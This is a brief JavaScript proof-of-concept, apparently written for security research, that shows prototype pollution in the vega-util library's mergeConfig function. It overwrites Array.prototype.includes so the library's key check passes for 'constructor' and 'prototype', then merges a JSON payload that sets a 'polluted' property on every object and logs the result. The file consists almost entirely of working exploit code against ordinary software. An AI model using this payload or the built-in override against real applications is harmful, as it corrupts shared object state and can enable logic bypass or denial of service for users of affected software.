Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const util = require('vega-util');
const config = '{style: {point: {shape: triangle-right}}}';
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
util.mergeConfig(config, JSON.parse(malicious_payload));
console.log({}.polluted);